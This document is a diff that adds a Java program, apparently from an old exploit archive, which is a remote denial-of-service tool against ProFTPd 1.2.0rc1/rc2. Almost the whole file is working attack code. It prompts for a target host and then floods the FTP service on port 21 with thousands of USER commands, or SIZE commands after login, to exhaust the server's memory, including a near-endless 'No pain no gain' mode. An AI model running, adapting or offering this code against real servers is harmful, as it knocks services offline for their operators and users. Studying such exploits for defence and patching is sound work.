@@ -1,0 +1,347 @@
+/*      ProFTPd DoS version 1.1
+
+	Remote DoS in proFTPd
+
+        
+
+	Code by: JeT-Li         -The Wushu Master-      jet_li_man@yahoo.com
+
+	
+
+        Recently I posted a remote DoS for ProFTPd based in the multiple use
+
+	of the SIZE command in order to crash the system. Now and thanks to
+
+	the information provided by Wojciech Purczynski I have coded a
+
+	program that not only use the SIZE command but also the USER command.
+
+	So at this time access to the ftp is not necessary to manage a DoS
+
+	attack. The concept is equal to the last exploit one, but using
+
+	multiple USER instead of SIZE.   
+
+     
+
+	You don't have to give arguments when you execute the program, it
+
+	will request you these.
+
+ 	 	         
+
+	Greets: _kiss_ (the real fucker ;-P); gordoc (no comment, the most
+
+	hax man in the w0rld); Perip|o (tibetan mantras for u! ;-P); and all
+
+	the ppl of #hackers (not able for cardiac XD). 	  
+
+	
+
+	Vulnerable systems: 
+
+	ProFTPd 1.2.0rc1        (Tested)         
+
+	ProFTPd 1.2.0rc2        (Tested)         
+
+	And maybe others(1.2.0preX); I have no test this, but I'm sure you
+
+	can do it for me ;-)	
+
+	NOTE: 1.2.0pre10 is seems to be vulnerable according to the words of
+
+	Wojciech Purczynski ... */
+
+
+
+import java.net.*;
+
+import java.io.*;
+
+
+
+class TCPconnection {
+
+    
+
+    public TCPconnection (String hostname, int portnumber) throws Exception {
+
+    Socket s = doaSocket(hostname, portnumber);
+
+    br = new BufferedReader (new InputStreamReader (s.getInputStream()));
+
+    ps = new PrintStream (s.getOutputStream());
+
+    }
+
+    
+
+    public String readLine() throws Exception {
+
+    String s;
+
+    try {	s = br.readLine();	}
+
+    catch (IOException ioe) {
+
+    System.out.println("TCP Error ... it's a little hax0r exception ;-)");
+
+    throw new Exception ("\nInput Error: I/O Error");
+
+	}
+
+    return s;
+
+    }
+
+    
+
+    public void println(String s) {
+
+	ps.println(s);
+
+    }
+
+    
+
+    private Socket doaSocket(String hostname, int portnumber) throws Exception {
+
+    Socket s = null;
+
+    int attempts = 0;
+
+    while (s == null && attempts<maxattempts) {
+
+    try {	s = new Socket(hostname, portnumber);	}
+
+    catch (UnknownHostException uhe) {
+
+    System.err.println("It was no posible to establish the TCP connection.\n" + "Reason: unknown hostname " + hostname + ". Here is the Exception:");
+
+    throw new Exception("\nConnection Error: " + "unknown hostname");
+
+    }
+
+    catch (IOException ioe) {
+
+    System.err.println("The connection was not accomplished due to an I/O Error: trying it again ...");
+
+    }
+
+    attempts++;
+
+    }
+
+    if (s == null) throw new IOException("\nThe connection was not accomplished due to an I/O Error: trying it again ...");
+
+    else return s; }
+
+    private final int maxattempts = 5;
+
+    private BufferedReader br;
+
+    private PrintStream ps;
+
+    
+
+    }
+
+    
+
+class proftpDoS {
+
+    
+
+    public static void main(String[] arg) throws Exception {
+
+    InputStreamReader isr;
+
+    BufferedReader tcld;
+
+    String hostnamez, username, password, file, s1, option, option1;
+
+    int i, j, k, m;
+
+    isr = new InputStreamReader(System.in);
+
+    tcld = new BufferedReader(isr);
+
+    System.out.println("ProFTPd DoS version 1.1 by JeT-Li -The Wushu Master-");
+
+    System.out.println("Code in an attempt to solve Fermat Last's Theoreme");
+
+    System.out.println("Please choose the type of attack you wanna use; insert only the NUMBER, i.e.: 1");
+
+    System.out.println("1) Memory leakage using USER command");
+
+    System.out.println("2) Memory leakage using SIZE command");
+
+    System.out.print("Option: ");
+
+    option = tcld.readLine();
+
+    m = Integer.parseInt(option);
+
+    while (!(m==1 || m==2)) {
+
+    System.out.print("Option not valid, please try again: ");
+
+    option = tcld.readLine();
+
+    m = Integer.parseInt(option); }
+
+    if (m==1) {
+
+    hostnamez = "";	
+
+    while (hostnamez.length()==0) {
+
+    System.out.print("Please enter the hostname/IP: ");
+
+    hostnamez = tcld.readLine(); }
+
+    System.out.println("Choose one of this options; insert only the NUMBER, i.e.: 1");
+
+    System.out.println("1) Request 15000 size's to the server (it may be enough)");
+
+    System.out.println("2) \"No pain no gain\" (pseudo-eternal requests, ey it may be harm ;-P)");
+
+    System.out.print("Option: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1);
+
+    while (!(k==1 || k==2)) {
+
+    System.out.print("Option not valid, please try again: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1); }
+
+    TCPconnection tc = new TCPconnection(hostnamez, 21);
+
+        if (k==1) {
+
+	for(i=0;i<15000;i++)
+
+	tc.println("user themosthax0ruserthatthisw0rldhaseverseen" + i); }
+
+    else if (k==2) {
+
+    for(i=1;i<100;i++)
+
+	for(j=2;j<((int)Math.pow(j,i ));j++)
+
+	    tc.println("user themosthax0ruserthatthisw0rldhaseverseen" + j); }
+
+    tc.println("quit");
+
+    s1 = tc.readLine();
+
+    while (s1!=null) {
+
+    s1 = tc.readLine();
+
+    System.out.println("Attack completed ... as one of my friends says:");
+
+    System.out.println("Hack just r0cks ;-)");
+
+    }
+
+    }
+
+    else if (m==2) {
+
+    hostnamez = "";	
+
+    while (hostnamez.length()==0) {
+
+    System.out.print("Please enter the hostname/IP: ");
+
+    hostnamez = tcld.readLine(); }
+
+    username = "";
+
+    while (username.length()==0) {
+
+    System.out.print("Enter the username: ");
+
+    username = tcld.readLine(); }
+
+    password = "";
+
+    while (password.length()==0) { 
+
+    System.out.print("Enter the password for that username: ");
+
+    password = tcld.readLine(); }
+
+    file = "";
+
+    while (file.length()==0) {
+
+    System.out.print("Enter a valid filename on the FTP \n(with correct path of course ;-): ");
+
+    file = tcld.readLine(); }
+
+    System.out.println("Choose one of this options; insert only the NUMBER, i.e.: 1");
+
+    System.out.println("1) Request 15000 size's to the server (it may be enough)");
+
+    System.out.println("2) \"No pain no gain\" (pseudo-eternal requests, ey it may be harm ;-P)");
+
+    System.out.print("Option: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1);
+
+    while (!(k==1 || k==2)) {
+
+    System.out.print("Option not valid, please try again: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1); }
+
+    TCPconnection tc = new TCPconnection(hostnamez, 21);
+
+    tc.println("user " + username);
+
+    tc.println("pass " + password);
+
+    if (k==1) {
+
+	for(i=0;i<10000;i++)
+
+	tc.println("size " + file); }
+
+    else if (k==2) {
+
+    for(i=1;i<100;i++)
+
+	for(j=2;j<((int)Math.pow(j,i ));j++)
+
+	    tc.println("size " + file); }
+
+    tc.println("quit");
+
+    s1 = tc.readLine();
+
+    while (s1!=null) {
+
+    s1 = tc.readLine();
+
+    System.out.println("Attack completed ... as one of my friends says:");
+
+    System.out.println("Hack just r0cks ;-)");
+
+    }
+
+    }
+
+    }
+
+}
